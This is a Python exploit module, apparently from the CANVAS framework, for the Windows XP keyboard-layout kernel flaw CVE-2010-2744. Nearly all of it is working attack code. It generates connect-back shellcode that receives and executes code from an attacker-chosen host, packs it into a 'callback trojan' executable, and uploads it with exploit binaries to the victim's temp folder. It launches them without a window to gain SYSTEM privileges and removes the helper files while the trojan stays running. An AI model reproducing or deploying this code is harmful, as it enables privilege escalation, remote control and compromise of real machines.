#!/usr/bin/env python
# ms_kblayout.py
# (c) Immunity, Inc. 2010


import sys
import os

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from canvasexploit import canvasexploit
from exploitutils import *
import shellcode.standalone.windows.payloads as payloads
from shellcode import shellcodeGenerator
from MOSDEF import pelib


NAME                                = 'MS_KBLAYOUT'
VERSION                             = '1.0'
DESCRIPTION                         = 'MS NtUserLoadKeyboardLayoutEx kernel code execution'

DOCUMENTATION                       = {}
DOCUMENTATION['VENDOR']             = 'Microsoft'
DOCUMENTATION['Repeatability']      = 'Single Shot'
DOCUMENTATION['VersionsAffected']   = 'Windows'
DOCUMENTATION['CVE Name']           = 'CVE-2010-2744'
DOCUMENTATION['CVE URL']            = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2744'
DOCUMENTATION["Notes"]              = '''

This is one of the vulnerabilities used by the Stuxnet work to elevate
its privileges on Windows XP and Windows 2000. It may cause some minor
side effects on the terminal since it works by changing the current
keyboard context.

This vulnerability is currently unpatched, and has been tested to be
language and service pack independent.

'''

PROPERTY                            = {}
PROPERTY['TYPE']                    = 'Exploit'
PROPERTY['SITE']                    = 'Local'
PROPERTY['ARCH']                    = [ ['Windows', 'i386'] ]
PROPERTY['VERSION']                 = [ '2000', 'XP' ]
PROPERTY['MSADV']                   = 'MS10-073'
PROPERTY['MS PATCHES']              = ["KB981957"]

from ExploitTypes.localexploit import LocalExploit
from engine.config import canvas_root_directory

import random

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.MSKBLAYOUT     = [ 'MS_KBLAYOUT.exe' , 'MS_KBLAYOUT.dat' ]
        self.local_path     = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.remote_path    = '%TMP%\\' # remote base path
        self.trojan_name    = 'CB%s.EXE'%random.randint(0,1000)
        return

    def get_args(self):
        """
        Retrieve and initialize arguments
        """
        self.node           = self.argsDict['passednodes'][0]
        return

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def init_MSKBLAYOUT(self):
        """
        Uploads the MS_KBLAYOUT exe and keyboard layout file
        """
        for file in self.MSKBLAYOUT:
            src = os.path.join(self.local_path, file)
            dst = self.remote_path + file
            try:
                self.node.shell.upload(src, destfilename = dst)
                self.log('[+] Uploaded %s to %s' % (src, dst))
            except:
                import traceback
                traceback.print_exc(file=sys.stderr)
                self.log('[-] Could not upload %s to %s' % (src, dst))
                return False
        return True

    def uninit_MSKBLAYOUT(self):
        """
        Remove the MSKBLAYOUT exe/dat
        """
        for file in self.MSKBLAYOUT:
            try:
                ret = self.node.shell.unlink(self.remote_path + file)
                self.log('[+] %s' % ret)
            except:
                import traceback
                traceback.print_exc(file=sys.stderr)
                return False
        return True

    def spawn_MSKBLAYOUT(self, arg1, arg2):
        """
        spawn MSKBLAYOUT
        """
        try:
            ret = self.node.shell.CreateProcessA(self.remote_path + self.MSKBLAYOUT[0] + ' ' +'"'+arg1+'"' + ' ' +'"'+arg2+'"',
                                                 inherithandles=1,
                                                 dwCreationFlags = 0x00000200)
                                                    # CREATE_NO_WINDOW|CREATE_NEW_PROCESS_GROUP
#            ret = self.node.shell.runcommand(self.remote_path + self.MSKBLAYOUT[0] + ' ' +'"'+arg+'"')
#						 # CREATE_NO_WINDOW|CREATE_NEW_PROCESS_GROUP
            self.log(ret)
            if not ret:
                return False
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def init_callback(self):
        """
        Build + upload the MOSDEF callback trojan
        """
        if not self.callback:
            self.log('[-] No callback set!')
            return False
        trojan = ''
        try:
            sc = shellcodeGenerator.win32()
            sc.addAttr('findeipnoesp', {'subespval': 0})
            sc.addAttr('revert_to_self_before_importing_ws2_32', None)
            sc.addAttr('tcpconnect', {'port' : self.callback.port,
                                      'ipaddress' : self.callback.ip})
            mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id=self.engine.getNewMosdefID(self)
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
            sc.addAttr("ExitThread",None)
            sc.vAllocSelf = True #we need to move to another page!
            callback_payload = sc.get()
            myPElib = pelib.PElib()
            trojan = myPElib.createPEFileBuf(callback_payload)

            # write out the binary
            src = os.path.join(self.local_path, self.trojan_name)
            self.log('[+] Creating callback trojan in %s' % src)
            fd = open(src, 'wb')
            fd.write(trojan)
            fd.close()
            # upload the binary
            self.log('[+] Uploading callback trojan ...')
            ret = self.node.shell.upload(src, destfilename = self.remote_path + self.trojan_name)
            self.log('[+] %s' % ret)
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def run(self):

        self.get_args()

        if self.node.nodetype.lower() not in ['win32node']:
            self.log('[-] Node Type not supported ...')
            return False

        #first, we check to make sure we are not
        #already local/SYSTEM - is there a better way?
        whoami=self.exploitnodes('whoami',[self.node])[0]
        self.log('Currently running as: %s'%(whoami))
        if whoami[-1]=='$':
            self.log("It appears you are already running as LOCAL/SYSTEM!")
            return 1

        ret,nodeos=self.node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        if (major,minor) not in [(5,1)]:
            self.log('This exploit is only for Windows XP')
            return 0

        self.remote_path = self.node.shell.GetTempPathA()
        if not self.remote_path:
            self.log('[-] Could not resolve full temp dir path ...')
            return False
        else:
            self.log('[-] Temp dir: %s' % self.remote_path)

        if self.node.shell.chdir(self.remote_path) < 0:
            self.log('[-] Could not chdir into %s' % self.remote_path)
            return False

        # build and upload callback trojan
        if self.init_callback() == False:
            self.log('[-] Could not init callback ...')
            return False

        # upload ms_kblayout binaries
        if self.init_MSKBLAYOUT() == False:
            self.log('[-] Could not init MS_KBLAYOUT ...')
            return False

        # spawn ms_kblayout
        if self.spawn_MSKBLAYOUT(self.remote_path + self.trojan_name, self.remote_path + self.MSKBLAYOUT[1]) == False:
            self.log('[-] Could not spawn MS_KBLAYOUT ...')
            return False

        self.log('[+] Sleeping 3 seconds before MS_KBLAYOUT uninit ...')
        time.sleep(3)

        # remove files ... can't remove trojan (active process)
        if self.uninit_MSKBLAYOUT() == False:
            self.log('[-] Could not uninit MS_KBLAYOUT...')
            return False

        self.log('[+] NOTE: %s\\%s still exists on the host!' % (self.remote_path, self.trojan_name))

        # check for callback success ...
        if self.ISucceeded():
            self.log('[+] MS_KBLAYOUT succeeded ...')
        else:
            self.log('[-] MS_KBLAYOUT failed ...')
            return False

        return True

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
